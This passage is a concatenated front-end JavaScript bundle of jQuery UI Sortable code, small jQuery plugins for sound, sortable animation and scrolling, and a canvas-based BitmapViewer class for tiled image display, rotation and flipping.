e=this.currentItem.find(":data("+this.widgetName+"-item)");this.items=t.grep(this.items,function(t){for(var i=0;e.length>i;i++)if(e[i]===t.item[0])return!1;return!0})},_refreshItems:function(e){this.items=[],this.containers=[this];var i,s,n,o,a,r,l,h,c=this.items,u=[[t.isFunction(this.options.items)?this.options.items.call(this.element[0],e,{item:this.currentItem}):t(this.options.items,this.element),this]],d=this._connectWith();if(d&&this.ready)for(i=d.length-1;i>=0;i--)for(n=t(d[i],this.document[0]),s=n.length-1;s>=0;s--)o=t.data(n[s],this.widgetFullName),o&&o!==this&&!o.options.disabled&&(u.push([t.isFunction(o.options.items)?o.options.items.call(o.element[0],e,{item:this.currentItem}):t(o.options.items,o.element),o]),this.containers.push(o));for(i=u.length-1;i>=0;i--)for(a=u[i][1],r=u[i][0],s=0,h=r.length;h>s;s++)l=t(r[s]),l.data(this.widgetName+"-item",a),c.push({item:l,instance:a,width:0,height:0,left:0,top:0})},refreshPositions:function(e){this.floating=this.items.length?"x"===this.options.axis||this._isFloating(this.items[0].item):!1,this.offsetParent&&this.helper&&(this.offset.parent=this._getParentOffset());var i,s,n,o;for(i=this.items.length-1;i>=0;i--)s=this.items[i],s.instance!==this.currentContainer&&this.currentContainer&&s.item[0]!==this.currentItem[0]||(n=this.options.toleranceElement?t(this.options.toleranceElement,s.item):s.item,e||(s.width=n.outerWidth(),s.height=n.outerHeight()),o=n.offset(),s.left=o.left,s.top=o.top);if(this.options.custom&&this.options.custom.refreshContainers)this.options.custom.refreshContainers.call(this);else for(i=this.containers.length-1;i>=0;i--)o=this.containers[i].element.offset(),this.containers[i].containerCache.left=o.left,this.containers[i].containerCache.top=o.top,this.containers[i].containerCache.width=this.containers[i].element.outerWidth(),this.containers[i].containerCache.height=this.containers[i].element.outerHeight();return this},_createPlaceholder:function(e){e=e||this;var i,s=e.options;s.placeholder&&s.placeholder.constructor!==String||(i=s.placeholder,s.placeholder={element:function(){var s=e.currentItem[0].nodeName.toLowerCase(),n=t("<"+s+">",e.document[0]).addClass(i||e.currentItem[0].className+" ui-sortable-placeholder").removeClass("ui-sortable-helper");return"tbody"===s?e._createTrPlaceholder(e.currentItem.find("tr").eq(0),t("<tr>",e.document[0]).appendTo(n)):"tr"===s?e._createTrPlaceholder(e.currentItem,n):"img"===s&&n.attr("src",e.currentItem.attr("src")),i||n.css("visibility","hidden"),n},update:function(t,n){(!i||s.forcePlaceholderSize)&&(n.height()||n.height(e.currentItem.innerHeight()-parseInt(e.currentItem.css("paddingTop")||0,10)-parseInt(e.currentItem.css("paddingBottom")||0,10)),n.width()||n.width(e.currentItem.innerWidth()-parseInt(e.currentItem.css("paddingLeft")||0,10)-parseInt(e.currentItem.css("paddingRight")||0,10)))}}),e.placeholder=t(s.placeholder.element.call(e.element,e.currentItem)),e.currentItem.after(e.placeholder),s.placeholder.update(e,e.placeholder)},_createTrPlaceholder:function(e,i){var s=this;e.children().each(function(){t("<td>&#160;</td>",s.document[0]).attr("colspan",t(this).attr("colspan")||1).appendTo(i)})},_contactContainers:function(e){var i,s,n,o,a,r,l,h,c,u,d=null,p=null;for(i=this.containers.length-1;i>=0;i--)if(!t.contains(this.currentItem[0],this.containers[i].element[0]))if(this._intersectsWith(this.containers[i].containerCache)){if(d&&t.contains(this.containers[i].element[0],d.element[0]))continue;d=this.containers[i],p=i}else this.containers[i].containerCache.over&&(this.containers[i]._trigger("out",e,this._uiHash(this)),this.containers[i].containerCache.over=0);if(d)if(1===this.containers.length)this.containers[p].containerCache.over||(this.containers[p]._trigger("over",e,this._uiHash(this)),this.containers[p].containerCache.over=1);else{for(n=1e4,o=null,c=d.floating||this._isFloating(this.currentItem),a=c?"left":"top",r=c?"width":"height",u=c?"clientX":"clientY",s=this.items.length-1;s>=0;s--)t.contains(this.containers[p].element[0],this.items[s].item[0])&&this.items[s].item[0]!==this.currentItem[0]&&(l=this.items[s].item.offset()[a],h=!1,e[u]-l>this.items[s][r]/2&&(h=!0),n>Math.abs(e[u]-l)&&(n=Math.abs(e[u]-l),o=this.items[s],this.direction=h?"up":"down"));if(!o&&!this.options.dropOnEmpty)return;if(this.currentContainer===this.containers[p])return this.currentContainer.containerCache.over||(this.containers[p]._trigger("over",e,this._uiHash()),this.currentContainer.containerCache.over=1),void 0;o?this._rearrange(e,o,null,!0):this._rearrange(e,null,this.containers[p].element,!0),this._trigger("change",e,this._uiHash()),this.containers[p]._trigger("change",e,this._uiHash(this)),this.currentContainer=this.containers[p],this.options.placeholder.update(this.currentContainer,this.placeholder),this.containers[p]._trigger("over",e,this._uiHash(this)),this.containers[p].containerCache.over=1}},_createHelper:function(e){var i=this.options,s=t.isFunction(i.helper)?t(i.helper.apply(this.element[0],[e,this.currentItem])):"clone"===i.helper?this.currentItem.clone():this.currentItem;return s.parents("body").length||t("parent"!==i.appendTo?i.appendTo:this.currentItem[0].parentNode)[0].appendChild(s[0]),s[0]===this.currentItem[0]&&(this._storedCSS={width:this.currentItem[0].style.width,height:this.currentItem[0].style.height,position:this.currentItem.css("position"),top:this.currentItem.css("top"),left:this.currentItem.css("left")}),(!s[0].style.width||i.forceHelperSize)&&s.width(this.currentItem.width()),(!s[0].style.height||i.forceHelperSize)&&s.height(this.currentItem.height()),s},_adjustOffsetFromHelper:function(e){"string"==typeof e&&(e=e.split(" ")),t.isArray(e)&&(e={left:+e[0],top:+e[1]||0}),"left"in e&&(this.offset.click.left=e.left+this.margins.left),"right"in e&&(this.offset.click.left=this.helperProportions.width-e.right+this.margins.left),"top"in e&&(this.offset.click.top=e.top+this.margins.top),"bottom"in e&&(this.offset.click.top=this.helperProportions.height-e.bottom+this.margins.top)},_getParentOffset:function(){this.offsetParent=this.helper.offsetParent();var e=this.offsetParent.offset();return"absolute"===this.cssPosition&&this.scrollParent[0]!==this.document[0]&&t.contains(this.scrollParent[0],this.offsetParent[0])&&(e.left+=this.scrollParent.scrollLeft(),e.top+=this.scrollParent.scrollTop()),(this.offsetParent[0]===this.document[0].body||this.offsetParent[0].tagName&&"html"===this.offsetParent[0].tagName.toLowerCase()&&t.ui.ie)&&(e={top:0,left:0}),{top:e.top+(parseInt(this.offsetParent.css("borderTopWidth"),10)||0),left:e.left+(parseInt(this.offsetParent.css("borderLeftWidth"),10)||0)}},_getRelativeOffset:function(){if("relative"===this.cssPosition){var t=this.currentItem.position();return{top:t.top-(parseInt(this.helper.css("top"),10)||0)+this.scrollParent.scrollTop(),left:t.left-(parseInt(this.helper.css("left"),10)||0)+this.scrollParent.scrollLeft()}}return{top:0,left:0}},_cacheMargins:function(){this.margins={left:parseInt(this.currentItem.css("marginLeft"),10)||0,top:parseInt(this.currentItem.css("marginTop"),10)||0}},_cacheHelperProportions:function(){this.helperProportions={width:this.helper.outerWidth(),height:this.helper.outerHeight()}},_setContainment:function(){var e,i,s,n=this.options;"parent"===n.containment&&(n.containment=this.helper[0].parentNode),("document"===n.containment||"window"===n.containment)&&(this.containment=[0-this.offset.relative.left-this.offset.parent.left,0-this.offset.relative.top-this.offset.parent.top,"document"===n.containment?this.document.width():this.window.width()-this.helperProportions.width-this.margins.left,("document"===n.containment?this.document.width():this.window.height()||this.document[0].body.parentNode.scrollHeight)-this.helperProportions.height-this.margins.top]),/^(document|window|parent)$/.test(n.containment)||(e=t(n.containment)[0],i=t(n.containment).offset(),s="hidden"!==t(e).css("overflow"),this.containment=[i.left+(parseInt(t(e).css("borderLeftWidth"),10)||0)+(parseInt(t(e).css("paddingLeft"),10)||0)-this.margins.left,i.top+(parseInt(t(e).css("borderTopWidth"),10)||0)+(parseInt(t(e).css("paddingTop"),10)||0)-this.margins.top,i.left+(s?Math.max(e.scrollWidth,e.offsetWidth):e.offsetWidth)-(parseInt(t(e).css("borderLeftWidth"),10)||0)-(parseInt(t(e).css("paddingRight"),10)||0)-this.helperProportions.width-this.margins.left,i.top+(s?Math.max(e.scrollHeight,e.offsetHeight):e.offsetHeight)-(parseInt(t(e).css("borderTopWidth"),10)||0)-(parseInt(t(e).css("paddingBottom"),10)||0)-this.helperProportions.height-this.margins.top])},_convertPositionTo:function(e,i){i||(i=this.position);var s="absolute"===e?1:-1,n="absolute"!==this.cssPosition||this.scrollParent[0]!==this.document[0]&&t.contains(this.scrollParent[0],this.offsetParent[0])?this.scrollParent:this.offsetParent,o=/(html|body)/i.test(n[0].tagName);return{top:i.top+this.offset.relative.top*s+this.offset.parent.top*s-("fixed"===this.cssPosition?-this.scrollParent.scrollTop():o?0:n.scrollTop())*s,left:i.left+this.offset.relative.left*s+this.offset.parent.left*s-("fixed"===this.cssPosition?-this.scrollParent.scrollLeft():o?0:n.scrollLeft())*s}},_generatePosition:function(e){var i,s,n=this.options,o=e.pageX,a=e.pageY,r="absolute"!==this.cssPosition||this.scrollParent[0]!==this.document[0]&&t.contains(this.scrollParent[0],this.offsetParent[0])?this.scrollParent:this.offsetParent,l=/(html|body)/i.test(r[0].tagName);return"relative"!==this.cssPosition||this.scrollParent[0]!==this.document[0]&&this.scrollParent[0]!==this.offsetParent[0]||(this.offset.relative=this._getRelativeOffset()),this.originalPosition&&(this.containment&&(e.pageX-this.offset.click.left<this.containment[0]&&(o=this.containment[0]+this.offset.click.left),e.pageY-this.offset.click.top<this.containment[1]&&(a=this.containment[1]+this.offset.click.top),e.pageX-this.offset.click.left>this.containment[2]&&(o=this.containment[2]+this.offset.click.left),e.pageY-this.offset.click.top>this.containment[3]&&(a=this.containment[3]+this.offset.click.top)),n.grid&&(i=this.originalPageY+Math.round((a-this.originalPageY)/n.grid[1])*n.grid[1],a=this.containment?i-this.offset.click.top>=this.containment[1]&&i-this.offset.click.top<=this.containment[3]?i:i-this.offset.click.top>=this.containment[1]?i-n.grid[1]:i+n.grid[1]:i,s=this.originalPageX+Math.round((o-this.originalPageX)/n.grid[0])*n.grid[0],o=this.containment?s-this.offset.click.left>=this.containment[0]&&s-this.offset.click.left<=this.containment[2]?s:s-this.offset.click.left>=this.containment[0]?s-n.grid[0]:s+n.grid[0]:s)),{top:a-this.offset.click.top-this.offset.relative.top-this.offset.parent.top+("fixed"===this.cssPosition?-this.scrollParent.scrollTop():l?0:r.scrollTop()),left:o-this.offset.click.left-this.offset.relative.left-this.offset.parent.left+("fixed"===this.cssPosition?-this.scrollParent.scrollLeft():l?0:r.scrollLeft())}},_rearrange:function(t,e,i,s){i?i[0].appendChild(this.placeholder[0]):e.item[0].parentNode.insertBefore(this.placeholder[0],"down"===this.direction?e.item[0]:e.item[0].nextSibling),this.counter=this.counter?++this.counter:1;var n=this.counter;this._delay(function(){n===this.counter&&this.refreshPositions(!s)})},_clear:function(t,e){function i(t,e,i){return function(s){i._trigger(t,s,e._uiHash(e))}}this.reverting=!1;var s,n=[];if(!this._noFinalSort&&this.currentItem.parent().length&&this.placeholder.before(this.currentItem),this._noFinalSort=null,this.helper[0]===this.currentItem[0]){for(s in this._storedCSS)("auto"===this._storedCSS[s]||"static"===this._storedCSS[s])&&(this._storedCSS[s]="");this.currentItem.css(this._storedCSS).removeClass("ui-sortable-helper")}else this.currentItem.show();for(this.fromOutside&&!e&&n.push(function(t){this._trigger("receive",t,this._uiHash(this.fromOutside))}),!this.fromOutside&&this.domPosition.prev===this.currentItem.prev().not(".ui-sortable-helper")[0]&&this.domPosition.parent===this.currentItem.parent()[0]||e||n.push(function(t){this._trigger("update",t,this._uiHash())}),this!==this.currentContainer&&(e||(n.push(function(t){this._trigger("remove",t,this._uiHash())}),n.push(function(t){return function(e){t._trigger("receive",e,this._uiHash(this))}}.call(this,this.currentContainer)),n.push(function(t){return function(e){t._trigger("update",e,this._uiHash(this))}}.call(this,this.currentContainer)))),s=this.containers.length-1;s>=0;s--)e||n.push(i("deactivate",this,this.containers[s])),this.containers[s].containerCache.over&&(n.push(i("out",this,this.containers[s])),this.containers[s].containerCache.over=0);if(this.storedCursor&&(this.document.find("body").css("cursor",this.storedCursor),this.storedStylesheet.remove()),this._storedOpacity&&this.helper.css("opacity",this._storedOpacity),this._storedZIndex&&this.helper.css("zIndex","auto"===this._storedZIndex?"":this._storedZIndex),this.dragging=!1,e||this._trigger("beforeStop",t,this._uiHash()),this.placeholder[0].parentNode.removeChild(this.placeholder[0]),this.cancelHelperRemoval||(this.helper[0]!==this.currentItem[0]&&this.helper.remove(),this.helper=null),!e){for(s=0;n.length>s;s++)n[s].call(this,t);this._trigger("stop",t,this._uiHash())}return this.fromOutside=!1,!this.cancelHelperRemoval},_trigger:function(){t.Widget.prototype._trigger.apply(this,arguments)===!1&&this.cancel()},_uiHash:function(e){var i=e||this;return{helper:i.helper,placeholder:i.placeholder||t([]),position:i.position,originalPosition:i.originalPosition,offset:i.positionAbs,item:i.currentItem,sender:e?e.element:null}}})});
(function ($) {
    $.extend({
        playSound: debounce(function () {
            return $(
                '<audio class="sound-player" autoplay="autoplay" style="display:none;">'
                + '<source src="' + arguments[0] + '" />'
                + '<embed src="' + arguments[0] + '" hidden="true" autostart="true" loop="false"/>'
                + '</audio>'
            ).appendTo('body');
        }, 500, true),
        stopSound: function () {
            $(".sound-player").remove();
        }
    });

    function debounce(func, wait, immediate) {
        var timeout;
        return function() {
            var context = this,
                args = arguments;
            var later = function() {
                timeout = null;
                if (!immediate) func.apply(context, args);
            };
            var callNow = immediate && !timeout;
            clearTimeout(timeout);
            timeout = setTimeout(later, wait);
            if (callNow) func.apply(context, args);
        };
    };

})(jQuery);
/*!
 * jQuery UI Sortable Animation 0.0.1
 *
 * Copyright 2015, Egor Sharapov
 * Licensed under the MIT license.
 *
 * Depends:
 *  jquery.ui.sortable.js
 */
(function(factory) {
  if (typeof define === "function" && define.amd) {
    // AMD. Register as an anonymous module.
    define(["jquery", "jquery-ui"], factory);
  } else {
    // Browser globals
    factory(jQuery);
  }
}(function($) {
  var supports = {},
      testProp = function (prefixes) {
        var test_el = document.createElement('div'), i, l;

        for (i = 0; l = prefixes.length, i < l; i++) {
          if (test_el.style[prefixes[i]] != undefined) {
            return prefixes[i];
          }
        }

        return '';
      },
      use_css_animation = false;

  // check for css-transforms support
  supports['transform'] = testProp([
    'transform', 'WebkitTransform',
    'MozTransform', 'OTransform',
    'msTransform'
  ]);

  // check for css-transitions support
  supports['transition'] = testProp([
    'transition', 'WebkitTransition',
    'MozTransition', 'OTransition',
    'msTransition'
  ]);

  use_css_animation = supports['transform'] && supports['transition'];

  $.widget("ui.sortable", $.ui.sortable, {
    options: {
      // adds the new `animation` option, turned off by default.
      animation: 0,
    },

    // called internally by sortable when sortable
    // items are rearranged.
    _rearrange: function (e, item) {
      var $item,
          props = {},
          reset_props = {},
          offset,
          axis = $.trim(this.options.axis);

      // just call the original implementation of _rearrange()
      // if option `animation` is turned off
      // `currentContainer` used for animating received items
      // from another sortable container (`connectWith` option)
      if (!parseInt(this.currentContainer.options.animation) ||
          !axis
      ) {
        return this._superApply(arguments);
      }

      $item = $(item.item[0]);
      // if moved up, then move item up to its height,
      // if moved down, then move item down
      offset = (this.direction == 'up' ? '' : '-') + ($item[axis == 'x' ? 'width' : 'height']()) + 'px';

      // call original _rearrange() at first
      this._superApply(arguments);

      // prepare starting css props
      if (use_css_animation) {
        props[supports['transform']] = (axis == 'x' ? 'translateX' : 'translateY') + '(' + offset + ')';
      } else {
        props = {
          position: 'relative',
        };
        props[axis == 'x' ? 'left' : 'top'] = offset;
      }

      // set starting css props on item
      $item.css(props);

      // if css animations are not supported
      // use jQuery animations
      if (use_css_animation) {
        props[supports['transition']] = supports['transform'] + ' ' + this.options.animation + 'ms';
        props[supports['transform']] = '';
        reset_props[supports['transform']] = '';
        reset_props[supports['transition']] = '';

        setTimeout(function () {
          $item.css(props);
        }, 0);
      } else {
        reset_props.top = '';
        reset_props.position = '';

        $item.animate({
          top: '',
          position: ''
        }, this.options.animation);
      }

      // after animation ends
      // clear changed for animation props
      setTimeout(function () {
        $item.css(reset_props);
      }, this.options.animation);
    }
  });
}));

/**
 * Copyright (c) 2007-2015 Ariel Flesler - aflesler ○ gmail • com | http://flesler.blogspot.com
 * Licensed under MIT
 * @author Ariel Flesler
 * @version 2.1.3
 */
;(function(f){"use strict";"function"===typeof define&&define.amd?define(["jquery"],f):"undefined"!==typeof module&&module.exports?module.exports=f(require("jquery")):f(jQuery)})(function($){"use strict";function n(a){return!a.nodeName||-1!==$.inArray(a.nodeName.toLowerCase(),["iframe","#document","html","body"])}function h(a){return $.isFunction(a)||$.isPlainObject(a)?a:{top:a,left:a}}var p=$.scrollTo=function(a,d,b){return $(window).scrollTo(a,d,b)};p.defaults={axis:"xy",duration:0,limit:!0};$.fn.scrollTo=function(a,d,b){"object"=== typeof d&&(b=d,d=0);"function"===typeof b&&(b={onAfter:b});"max"===a&&(a=9E9);b=$.extend({},p.defaults,b);d=d||b.duration;var u=b.queue&&1<b.axis.length;u&&(d/=2);b.offset=h(b.offset);b.over=h(b.over);return this.each(function(){function k(a){var k=$.extend({},b,{queue:!0,duration:d,complete:a&&function(){a.call(q,e,b)}});r.animate(f,k)}if(null!==a){var l=n(this),q=l?this.contentWindow||window:this,r=$(q),e=a,f={},t;switch(typeof e){case "number":case "string":if(/^([+-]=?)?\d+(\.\d+)?(px|%)?$/.test(e)){e= h(e);break}e=l?$(e):$(e,q);case "object":if(e.length===0)return;if(e.is||e.style)t=(e=$(e)).offset()}var v=$.isFunction(b.offset)&&b.offset(q,e)||b.offset;$.each(b.axis.split(""),function(a,c){var d="x"===c?"Left":"Top",m=d.toLowerCase(),g="scroll"+d,h=r[g](),n=p.max(q,c);t?(f[g]=t[m]+(l?0:h-r.offset()[m]),b.margin&&(f[g]-=parseInt(e.css("margin"+d),10)||0,f[g]-=parseInt(e.css("border"+d+"Width"),10)||0),f[g]+=v[m]||0,b.over[m]&&(f[g]+=e["x"===c?"width":"height"]()*b.over[m])):(d=e[m],f[g]=d.slice&& "%"===d.slice(-1)?parseFloat(d)/100*n:d);b.limit&&/^\d+$/.test(f[g])&&(f[g]=0>=f[g]?0:Math.min(f[g],n));!a&&1<b.axis.length&&(h===f[g]?f={}:u&&(k(b.onAfterFirst),f={}))});k(b.onAfter)}})};p.max=function(a,d){var b="x"===d?"Width":"Height",h="scroll"+b;if(!n(a))return a[h]-$(a)[b.toLowerCase()]();var b="client"+b,k=a.ownerDocument||a.document,l=k.documentElement,k=k.body;return Math.max(l[h],k[h])-Math.min(l[b],k[b])};$.Tween.propHooks.scrollLeft=$.Tween.propHooks.scrollTop={get:function(a){return $(a.elem)[a.prop]()}, set:function(a){var d=this.get(a);if(a.options.interrupt&&a._last&&a._last!==d)return $(a.elem).stop();var b=Math.round(a.now);d!==b&&($(a.elem)[a.prop](b),a._last=this.get(a))}};return p});
/*
	Smooth Zoom Pan - jQuery Image Viewer
 	Copyright (c) 2011-14 Ramesh Kumar
	http://codecanyon.net/user/VF

	Version:	1.7.0
	RELEASE:	09 SEP 2011
	UPDATE:		27 May 2014

	Built using:
	jQuery 		version: 1.7.0+		http://jquery.com/
	Modernizr 	version: 2.8.2		http://www.modernizr.com/
	MouseWheel	version: 3.1.11		http://brandon.aaron.sh

*/
class BitmapViewer {
	#zoomer;
	#createBitmapWorker;
	#preloadBitmapWorker;
	#container;
	#dpr = 1;
	#canvas
	#bitmapTileCount;
	#bitmapTiles = [];
    #thumbBitmap;
	#viewport
    #renderTimeout;
    #renderTimeoutDuration;
    #thumbRatio;
	#height
	#width
	#thumbnailMode = false
	#tileSize = 500

	constructor (parentElement, zoomer) {
		this.#zoomer = zoomer;
        this.#container = parentElement;
        this.#canvas = null;
        this.#thumbBitmap = null;
        this.#viewport = {};
        this.url = null;
		this.#bitmapTiles = [];
		this.#bitmapTileCount = 0;
		this.preloadData = {};
	}

    clear() {
        clearTimeout(this.#renderTimeout);
        if (this.#canvas) {
            const ctx = this.#canvas.getContext('2d');
            ctx.clearRect(0, 0, this.#canvas.width, this.#canvas.height);
			this.url = null;
            this.#thumbBitmap = null;
			this.#bitmapTiles = [];
			this.#bitmapTileCount = 0;
			this.#viewport = {};
			clearTimeout(this.#renderTimeout);
        }
    }

	isSupportFormat(ext) {
		return ['jpg', 'jpeg', 'png', 'webp', 'avif', 'insp', 'jfif', 'jpe', 'jxl', 'bmp', 'svg'].includes(ext.toLowerCase());
	}

	clearPreloadData() {
		try {
			Object.keys(this.preloadData).forEach((key) => {
				const preloadData = this.preloadData[key];
				if (preloadData?.tiles) {
					preloadData.tiles.forEach((tile) => {
						tile?.tile?.close();
					});
				}
				if (preloadData?.bitmap) {
					preloadData?.bitmap?.close();
				}
			});
		} catch (error) {
			console.error(error);
		}
		finally {
			this.preloadData = {};
		}
	}

	preload(item) {
		if (!this.isSupportFormat(item.ext)) return;
		const url = $bodyScope.getRawUrl(item);

		if (this.#preloadBitmapWorker) {
			this.#preloadBitmapWorker.terminate();
			this.#preloadBitmapWorker = null;
		}

		this.#preloadBitmapWorker = new Worker('js/workers/bitmapWorker.js');
		this.#preloadBitmapWorker.postMessage({ url, item: {...item, url: url}, tileSize: this.#tileSize });

		this.#preloadBitmapWorker.onmessage = (e) => {
			if (e.data.error) {
				this.#preloadBitmapWorker.terminate();
			} else {
				if (!this.preloadData[url]) return;
				if (e.data.usingImgTag || e.data.bitmap) {
					this.preloadData[url].usingImgTag = e.data.usingImgTag;
					this.preloadData[url].bitmap = e.data.bitmap;
				}
				else if (e.data.tiles) {
					this.preloadData[url].tiles = e.data.tiles;
					this.#preloadBitmapWorker.terminate();
					// remove all key except current url
					for (const key in this.preloadData) {
						if (key !== url && key !== this.url) {
							const preloadData = this.preloadData[key];
							if (preloadData.tiles) {
								preloadData.tiles.forEach((tile) => {
									tile?.tile?.close();
								});
							}
							if (preloadData.bitmap) {
								preloadData.bitmap.close();
							}
							delete this.preloadData[key];
						}
					}
					// console.log(this.preloadData)
				}
			}
		};

		this.#preloadBitmapWorker.onerror = () => {
			this.#preloadBitmapWorker.terminate();
		};

		this.preloadData[url] = {
			url: url
		};
	}

	hideThumbnail() {
		const transparentImage = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAQSURBVHgBAQUA+v8AAAAAAAAFAAFkeJU4AAAAAElFTkSuQmCC";
		if ($("#detail-image").attr("src") !== transparentImage) {
			$("#detail-image").attr("src", transparentImage);
		}
	}

	async #loadURLFromWorker(url, item, onBitmapCallback, onTilesCallback) {
		return new Promise((resolve, reject) => {

			// if preloadData has current url, use it
			const preloadData = this.preloadData[url];
			if (preloadData && preloadData.usingImgTag !== undefined && preloadData.bitmap && preloadData.tiles) {
				onBitmapCallback(preloadData);
				onTilesCallback(preloadData.tiles);
				console.log('Using preload data');
				return;
			}

			if (this.#createBitmapWorker) {
				this.#createBitmapWorker.terminate();
				this.#createBitmapWorker = null;
			}

			this.#createBitmapWorker = new Worker('js/workers/bitmapWorker.js');
			this.#createBitmapWorker.postMessage({ url, item, tileSize: this.#tileSize });

			this.#createBitmapWorker.onmessage = (e) => {
				if (url !== this.url) {
					console.log('Image changed, ignore');
					this.#createBitmapWorker.terminate();
					return;
				}
				if (e.data.error) {
					reject(new Error(e.data.error));
					this.#createBitmapWorker.terminate();
				} else {
					if (e.data.usingImgTag || e.data.bitmap) {
						onBitmapCallback(e.data);
					}
					else if (e.data.tiles) {
						onTilesCallback(e.data.tiles);
						this.#createBitmapWorker.terminate();
					}
				}
			};

			this.#createBitmapWorker.onerror = () => {
				reject(new Error('Worker error occurred'));
				this.#createBitmapWorker.terminate();
			};
		});
	}

	async loadURL(url, item) {
		return new Promise((resolve, reject) => {
			try {
				if (this.url === url && this.#bitmapTiles.length > 0) return {};
				this.url = url;

				const thumbnailURL = $bodyScope.getThumbnailUrl(item);
				if ($("#detail-image").attr("src") === "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAQSURBVHgBAQUA+v8AAAAAAAAFAAFkeJU4AAAAAElFTkSuQmCC") {
					$("#detail-image").attr("src", thumbnailURL);
				}

				// 修改後版本
				this.#loadURLFromWorker(url, item, (result) => {
					const bitmap = result.bitmap;
					const usingImgTag = result.usingImgTag;

					if (usingImgTag) {
						return resolve({ usingImgTag: true });
					}

					this.#height = item.height;
					this.#width = item.width;
					this.#thumbnailMode = false;

					// NOTE: createBitmap 無法考慮 exif orientation，因此如果遇到 thumbBitmap 與 bitmap 的 orientation 不同，則只顯示原圖
					if (bitmap) {
						this.#thumbRatio = 1;
						this.#thumbBitmap = bitmap;
						this.#thumbnailMode = true;
					}

					this.#renderTimeoutDuration = this.#width * this.#height < 16000000 ? 10 : 200;
					this.#initCanvas();
					resolve();
				}, (tiles) => {
					this.#bitmapTiles = tiles ?? [];
					this.#thumbRatio = 1;
					this.#thumbBitmap.close();
					this.#thumbBitmap = null;
					this.#thumbnailMode = false;
					this.#render();
				});
			}
			catch (error) {
				throw new Error('Failed to load image');
			}
		});
	}

	// 根據 viewport 取得 bitmap 的 tiles
	getBitmapTiles(viewport) {
		const tiles = [];
		for (let i = 0; i < this.#bitmapTiles.length; i++) {
			const tile = this.#bitmapTiles[i];
			const tileLeft = tile.x;
			const tileRight = tile.x + tile.w;
			const tileTop = tile.y;
			const tileBottom = tile.y + tile.h;
			const viewportLeft = viewport.left;
			const viewportRight = viewport.left + viewport.width;
			const viewportTop = viewport.top;
			const viewportBottom = viewport.top + viewport.height;
			if (tileRight > viewportLeft && tileLeft < viewportRight && tileBottom > viewportTop && tileTop < viewportBottom) {
				tiles.push(tile);
			}
		}
		return tiles;
	}

	#initCanvas() {
		if (this.#container.querySelector('canvas')) {
			this.#canvas = this.#container.querySelector('canvas');
		} else {
			this.#canvas = document.createElement('canvas');
			this.#container.appendChild(this.#canvas);
		}

		$(this.#container).css({
			position: 'absolute',
			width: '100%',
			height: '100%',
			top: '0',
			left: '0',
			right: '0',
			bottom: '0',
			zIndex: '1',
			pointerEvents: 'none',
			display: 'flex',
			alignItems: 'center',
			justifyContent: 'center'

		});

		this.#dpr = window.devicePixelRatio;
		$(this.#canvas).css({
			position: 'absolute',
			top: '0',
			left: '0',
			right: '0',
			bottom: '0',
			width: '100%',
			height: '100%',
			pointerEvents: 'none',
			zoom: 1 / this.#dpr
		});
	}

	update(viewport) {
		const $container = $(this.#container);
        if ($container.length === 0 || !this.#canvas || !viewport?.id) return;
		const parentRect = { height: $container.height(), width: $container.width() };
		viewport = {url: this.url, ...viewport};
		
		if (window.devicePixelRatio !== this.#dpr) {
			this.#dpr = window.devicePixelRatio;
		}

		this.#canvas.width = parentRect.width * this.#dpr;
		this.#canvas.height = parentRect.height * this.#dpr;

		this.#viewport = viewport;
		this.#render();
	}

	#getCanvas() {
		const canvas = document.createElement('canvas');
		const ctx = canvas.getContext('2d');
		// 將 thumbnail 繪製到 canvas
		if (this.#thumbnailMode) {
			canvas.width = this.#thumbBitmap.width;
			canvas.height = this.#thumbBitmap.height;
			ctx.drawImage(this.#thumbBitmap, 0, 0);
		}
		// 將 tiles 繪製到 canvas
		else {
			canvas.width = this.#width;
			canvas.height = this.#height;
			for (let i = 0; i < this.#bitmapTiles.length; i++) {
				const tile = this.#bitmapTiles[i];
				ctx.drawImage(tile.tile, tile.x, tile.y);
			}
		}
		return canvas;
	}

	async rotate(degree) {
		const canvas = this.#getCanvas();
		const rotatedCanvas = this.#rotateCanvas(canvas, degree);
		this.#thumbBitmap = await createImageBitmap(rotatedCanvas);
		this.#thumbnailMode = true;
		this.#thumbRatio = 1;
	}

	#rotateCanvas(canvas, degree) {
		const rotatedCanvas = document.createElement('canvas');
		rotatedCanvas.width = canvas.height;
		rotatedCanvas.height = canvas.width;

		const ctx = rotatedCanvas.getContext('2d');

		if (degree === 90) {
			ctx.translate(rotatedCanvas.width, 0);
			ctx.rotate(90 * Math.PI / 180);
		} else if (degree === -90) {
			ctx.translate(0, rotatedCanvas.height);
			ctx.rotate(-90 * Math.PI / 180);
		} else {
			console.error('This function only supports rotations of 90 and -90 degrees.');
			return canvas;
		}

		ctx.drawImage(canvas, 0, 0);
		return rotatedCanvas;
	}

	async flip() {
		const canvas = this.#getCanvas();
		const flippedCanvas = this.#flipCanvas(canvas);
		this.#thumbBitmap = await createImageBitmap(flippedCanvas);
		this.#thumbnailMode = true;
		this.#thumbRatio = 1;
	}

	#flipCanvas(canvas) {
		const flippedCanvas = document.createElement('canvas');
		flippedCanvas.width = canvas.width;
		flippedCanvas.height = canvas.height;

		const ctx = flippedCanvas.getContext('2d');
		ctx.translate(canvas.width, 0);
		ctx.scale(-1, 1);
		ctx.drawImage(canvas, 0, 0);
		return flippedCanvas;
	}

	#render() {
		if (this.#thumbnailMode && this.#thumbBitmap) {
			this.#renderThumb();
			return;
		}

		if (this.#bitmapTiles.length === 0) return;

		const tiles = this.getBitmapTiles(this.#viewport);
		this.#renderRaw(tiles);
		this.hideThumbnail();
	}

	#renderRaw(tiles) {
		const ctx = this.#canvas.getContext('2d');
        ctx.imageSmoothingEnabled = (this.#zoomer.rA < 2) || (preferences.habits.renderBehavior !== 'pixelated');
		const ratio = this.#viewport.width / this.#canvas.width;
		const viewportWidth = parseInt(this.#canvas.width * ratio);
		const viewportHeight = parseInt(this.#canvas.height * ratio);

		for (let i = 0; i < tiles.length; i++) {
			const tile = tiles[i];
			const tileLeft = tile.x;
			const tileTop = tile.y;
			const tileWidth = tile.w;
			const tileHeight = tile.h;
			const viewportLeft = this.#viewport.left;
			const viewportTop = this.#viewport.top;
			const viewportWidth = parseInt(this.#canvas.width * ratio);
